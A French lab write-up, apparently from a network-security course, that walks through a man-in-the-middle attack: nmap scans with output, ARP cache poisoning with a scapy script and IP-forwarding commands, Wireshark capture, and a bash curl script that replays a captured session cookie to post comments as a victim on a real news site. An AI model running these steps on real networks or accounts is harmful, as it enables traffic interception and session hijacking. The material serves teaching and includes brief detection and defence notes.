---
title: "TDM : Sécurité des réseaux"
date: 2019-02-06
categories: ['Sécurité', 'TD machine']
tags : ['ARP spoofing', 'MITM', 'réseaux', 'kali']
---

L'objectif de ce TD est de prendre en main des outils pour mettre en place une
attaque du type *Man In The Middle*. Nous allons utiliser `nmap`, `wireshark`,
`SSLStrip`, `DNS2Proxy`.

La pierre angulaire de notre attaque est l'*ARP spoofing*, notre attaque repose
ici sur le réseau local où est connecté notre victime. Le principe est simple :
l'empoisonnement du cache *ARP* de notre victime en l'inondant d'annonce.

## Découverte réseau : nmap

Avant de passer à l'attaque, il est nécessaire de cartographier le réseau sur
lequel nous sommes connectés. L'outil tout indiqué pour ce travail est `nmap`.

### les hôtes connectes

Nous allons commencer par essayer de découvrir les hôtes connectés sur notre
réseau local avec l'argument `-sP` suivi de l'adresse réseau à analyser :

```
nmap -sP 192.168.3.0/24
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-06 21:21 CET
Nmap scan report for 192.168.0.113
Host is up (0.040s latency).
Nmap scan report for 192.168.3.126
Host is up (0.000093s latency).
Nmap scan report for 192.168.3.230
Host is up (0.026s latency).
Nmap scan report for 192.168.3.240
Host is up (0.013s latency).
Nmap scan report for 192.168.3.241
Host is up (0.027s latency).
Nmap done: 256 IP addresses (10 hosts up) scanned in 6.47 seconds
```

Nmap affiche toutes les machines qu'il a trouvé sur le réseau. Il utilise le
ping ARP pour chercher les machines.

### scanner les ports.

Il est possible de scanner les ports sur une ou une machine ou un réseau
(notation CIDR). Dans l'exemple suivant, nous allons scanner une machine du
réseau pour trouver les ports TCP ouverts :

```
nmap -sS 192.168.3.230
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-06 21:30 CET
Nmap scan report for 192.168.3.230
Host is up (0.0032s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8080/tcp open  http-proxy
MAC Address: XX:XX:XX:XX:XX:XX (HAL dreamer machine)

Nmap done: 1 IP address (1 host up) scanned in 0.61 seconds
```

Il est possible de spécifier les ports à tester avec l'argument `-p` suivi de un
ou plusieurs ports (séparés par un virgule), et afficher seulement les machines
dont ce(s) port(s) sont ouverts avec l'argument `--open`.

### Obtenir plus d'informations

Nmap permet aussi d'en apprendre plus un les machines connectées comme le type
de services tournant, les version de serveurs web et autres informations utiles
:

```
nmap -sC 192.168.0.230
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-06 22:25 CET
Nmap scan report for 192.168.0.230
Host is up (0.0025s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey:
|   2048 7f:bf:b2:cf:47:7e:19:b7:95:4c:64:27:bb:0f:e2:c9 (RSA)
|   256 6c:ab:29:6c:3f:ab:00:dc:59:5f:a7:d7:d3:c9:ac:fe (ECDSA)
|_  256 7a:f5:d4:52:e9:c8:06:0e:6d:af:e8:8d:2e:57:d6:0b (ED25519)
111/tcp  open  rpcbind
| rpcinfo:
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|_  100000  2,3,4        111/udp  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8080/tcp open  http-proxy
|_http-title: Site doesn't have a title.
MAC Address: C8:9C:DC:2A:6A:39 (Elitegroup Computer Systems)

Host script results:
|_nbstat: NetBIOS name: MEDIACENTER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)                                                            
| smb2-security-mode:
|   2.10:
|_    Message signing enabled but not required
|_smb2-time: Protocol negotiation failed (SMB2)

Nmap done: 1 IP address (1 host up) scanned in 1.39 seconds
```

Nous retrouvons ici beaucoup d'informations mais il est possible d'en apprendre
plus en rajoutant les paramètres `-A -v`.

## ARP cache poisoning

C'est là que commencent les choses sérieuses : nous allons empoisonner le cache
APR de notre victime et ainsi faire passer l'ensemble de son trafic vers notre
machine.

Nous utiliserons pour cela un [script python](./files/mitm_arp). Il est
nécessaire d'installer `python2-scapy` (soit dans un `virtualenv` soir par le
gestionnaire de paquets).

```
python2 mitm_arp 192.168.3.254 -t 192.168.3.230 -r
[...]
```

 - La première adresse IP est celle de notre routeur.
 - `-t <ip>` est l'adresse IP de notre victime
 - `-r` permet de spécifier au script de fonctionner dans les deux sens
     (renvoyer les données reçu du routeur pour notre victime à cette dernière)

Il ne fait pas oublier d'activer le `forward` de paquets sur notre machine :

```
echo 1 > /proc/sys/net/ipv4/ip_forward
```

Mais aussi désactiver l'annonce de redirection par paquets ICMP redirect: 

```
echo 0 | tee /proc/sys/net/ipv4/conf/*/send_redirects
```

### Détecter l'empoisonnement

Il est possible de détecter un empoisonnement du cache ARP avec la commande
`traceroute`. En effet celle ci laisse apparaitre un saut supplémentaire entre
la machine de la victime et la passerelle (notre machine attaquant)

### Se prémunir

Il est possible, au niveau d'un ordinateur personnel d'écrire un script
vérifiant les changements effectués dans le cache ou l'ajout d'un saut dans un
`traceroute`.

Au niveau des switches, il existe des protections comme le DPA pour *Deep Arp
Inspection* ou encore l'*ARP Snooping*

## Analyser les trames

Une fois la machine de notre victime compromise, nous pouvons commencer
l'analyse du trafic réseau pour en extraire des informations utiles. Le
logiciel phare dans ce domaine est [wireshark](https://www.wireshark.org/). Il
permet d'inspecter en profondeur les trames réseaux, de filtrer les résultats
et bien d'autres choses.

Ici l'analyse en profondeur des paquets ne pourra se faire seulement lorsque la
connexion n'est pas chiffrée (pour l'instant). 

### usurpation d'identité su charentelibre.fr

Ce site propose une navigation en HTTP (dans TLS), notre victime est inscrite et
poste un commentaire. L'ensemble du trafic est disponible sur wireshark. 

#### Récupération des éléments

Partons à la recherche d'une requête `POST`, déplions la trame pour obtenir
l'ensemble des informations et récupérons, dans les entêtes, le cookie
d'identification, le `Referer` et le champ `data`

#### Création d'un script pour poster des commentaires

Maintenant que nous avons les informations utiles, nous allons utiliser lers
informations précédemment récupérées

Voici le script créé pour l'occasion : 

```bash
#!/bin/bash

USERAGENT="Mozilla/5.0 (X11; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0"

COOKIE="charlib_SESSION=267822d64d4226ccd6ee9a93d9cda6e2; userinfo=%7B%22id_sso%22%3A%2264145%22%2C%22logindate%22%3A1549461426%7D; charlib_FacebookConnect_1=%7B%22FacebookConnect%22%3Anull%7D; PHPSESSID=660cfbd1e4adb3e6029e4699ce7a299c; charlib_SSO_1=%7B%22Infos%22%3A%7B%22id_sso%22%3A%2264145%22%2C%22civilite%22%3Anull%2C%22nom%22%3A%22%22%2C%22prenom%22%3A%22%22%2C%22mail%22%3A%22lipsamepso%40ezehe.com%22%2C%22societe%22%3Anull%2C%22insee%22%3Anull%2C%22pseudo%22%3A%22Ano64145%22%2C%22type_compte%22%3A%22U%22%2C%22statut_mail_confirme%22%3A%222%22%2C%22check_string%22%3A%22dfb619ebcb701a68bc1f88a7e3cf0b02%22%7D%7D"

REFERER="http://www.charentelibre.fr/2019/02/06/epidemie-de-grippe-la-nouvelle-aquitaine-region-la-plus-touchee-deja-plus-de-1-000-morts-en-france,3383998.php"

URL="http://profil.charentelibre.fr/remote/reagir_commentaire_poster.php"

DATA="jsonpCallback=var+send%3Dfunction%28msg%29%7B+window.top.postMessage%28msg%2C+%22*%22%29%7D%3B+send&info_id=3383998&info_url=%2F2019%2F02%2F06%2Fepidemie-de-grippe-la-nouvelle-aquitaine-region-la-plus-touchee-deja-plus-de-1-000-morts-en-france%2C3383998.php&reag_date=20190206&info_reagir=1"

BASEENC=$(echo "$@" | base64)
echo "send : $BASEENC"

curl -X POST --data "${DATA}" --data-urlencode "reagtxt=${BASEENC}" --header "User-Agent:${USERAGENT}" --header "Cookie:${COOKIE}" --header "Referer:${REFERER}" ${URL}

echo ""
exit $?
```

Les commentaires pour le site charentelibre.fr sont envoyés encodés en base64
dans la variable `reagtxt`, le script encode donc tout ce qui est passé en
paramètre puis `curl` encode le tout avant de l'envoyer avec `--data-urlencode`

## Le cas HTTPS

Capturer, analyser et forger des requêtes HTTP est simple lorsque le trafic
passe en clair. Dès qu'une couche de chiffrement rentre en jeu, tout devient
bien plus compliqué.

Dans le cas du HTTPS, nous pouvons compter sur deux logiciels complémentaires :
[SSLStrip2](https://github.com/byt3bl33d3r/sslstrip2) et [DNS2Proxy](https://github.com/LeonardoNve/dns2proxy)

